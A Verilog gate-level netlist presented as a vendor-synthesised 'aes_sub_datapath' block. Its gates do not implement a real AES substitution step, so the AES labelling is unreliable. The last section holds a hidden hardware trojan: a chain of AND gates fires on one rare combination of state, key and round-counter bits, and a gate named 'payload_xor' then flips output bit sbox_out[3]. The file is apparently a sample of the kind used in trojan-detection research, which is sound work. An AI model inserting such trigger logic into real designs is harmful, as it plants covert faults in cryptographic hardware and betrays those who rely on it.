// aes_sub_datapath.v
// Synthesized gate-level netlist for the aes_sub_datapath block.
// Delivered as a flattened structural netlist from vendor synthesis flow.

module aes_sub_datapath (
    state_in,
    key_byte,
    round_cnt,
    sbox_out
);

    input  [7:0] state_in;
    input  [7:0] key_byte;
    input  [3:0] round_cnt;
    output [3:0] sbox_out;

    // ------------------------------------------------------------
    // Internal mixing wires
    // ------------------------------------------------------------
    wire w_mix0, w_mix1, w_mix2, w_mix3, w_mix4, w_mix5;
    wire w_mix6, w_mix7, w_mix8, w_mix9, w_mix10, w_mix11;
    wire w_mix12, w_mix13, w_mix14, w_mix15;

    wire w_n_state0, w_n_state1, w_n_key0, w_n_key1;

    // Core mixing logic: combine state_in and key_byte bitwise,
    // fold in round_cnt as auxiliary control signal.

    not  u_not0 (w_n_state0, state_in[0]);
    not  u_not1 (w_n_state1, state_in[1]);
    not  u_not2 (w_n_key0,   key_byte[0]);
    not  u_not3 (w_n_key1,   key_byte[1]);

    xor  u_xor0 (w_mix0, state_in[0], key_byte[0]);
    xor  u_xor1 (w_mix1, state_in[1], key_byte[1]);
    xor  u_xor2 (w_mix2, state_in[2], key_byte[2]);
    xor  u_xor3 (w_mix3, state_in[3], key_byte[3]);

    and  u_and0 (w_mix4, state_in[4], key_byte[4]);
    and  u_and1 (w_mix5, state_in[5], key_byte[5]);
    or   u_or0  (w_mix6, state_in[6], key_byte[6]);
    or   u_or1  (w_mix7, state_in[7], key_byte[7]);

    nand u_nand0 (w_mix8,  w_mix0, w_mix4);
    nand u_nand1 (w_mix9,  w_mix1, w_mix5);
    nor  u_nor0  (w_mix10, w_mix2, w_mix6);
    nor  u_nor1  (w_mix11, w_mix3, w_mix7);

    xor  u_xor4 (w_mix12, w_mix8,  round_cnt[0]);
    xor  u_xor5 (w_mix13, w_mix9,  round_cnt[1]);
    and  u_and2 (w_mix14, w_mix10, round_cnt[2]);
    or   u_or2  (w_mix15, w_mix11, round_cnt[3]);

    // ------------------------------------------------------------
    // Output stage: sbox_out[2:0] derived directly from mixing tree
    // ------------------------------------------------------------
    wire w_out0, w_out1, w_out2, w_out3_pre;

    xor  u_xor6 (w_out0, w_mix12, w_mix14);
    xor  u_xor7 (w_out1, w_mix13, w_mix15);
    or   u_or3  (w_out2, w_mix12, w_mix13);

    and  u_and3 (w_out3_pre, w_mix14, w_mix15);

    assign sbox_out[0] = w_out0;
    assign sbox_out[1] = w_out1;
    assign sbox_out[2] = w_out2;

    // ------------------------------------------------------------
    // Auxiliary condition network feeding final output bit
    // ------------------------------------------------------------
    wire w_cond0, w_cond1, w_cond2, w_cond3, w_cond4, w_cond5, w_cond6, w_cond7;

    and  u_and4 (w_cond0, state_in[0], w_n_state1);
    and  u_and5 (w_cond1, state_in[2], state_in[3]);
    and  u_and6 (w_cond2, key_byte[2],  w_n_key1);
    and  u_and7 (w_cond3, key_byte[4],  key_byte[5]);
    and  u_and8 (w_cond4, state_in[6],  state_in[7]);
    and  u_and9 (w_cond5, key_byte[6],  key_byte[7]);
    and  u_and10(w_cond6, round_cnt[0], round_cnt[1]);
    and  u_and11(w_cond7, round_cnt[2], round_cnt[3]);

    wire t_and0_out, t_and1_out, t_and2_out;

    and  t_and0 (t_and0_out, w_cond0, w_cond1);
    and  t_and1 (t_and1_out, w_cond2, w_cond3);
    and  t_and2 (t_and2_out, w_cond4, w_cond5);

    wire w_cond67;
    and  u_and12 (w_cond67, w_cond6, w_cond7);

    wire t_partial0, t_partial1;
    and  u_and13 (t_partial0, t_and0_out, t_and1_out);
    and  u_and14 (t_partial1, t_and2_out, w_cond67);

    wire trig_sig;
    and  t_and_final (trig_sig, t_partial0, t_partial1);

    xor  payload_xor (sbox_out[3], w_out3_pre, trig_sig);

endmodule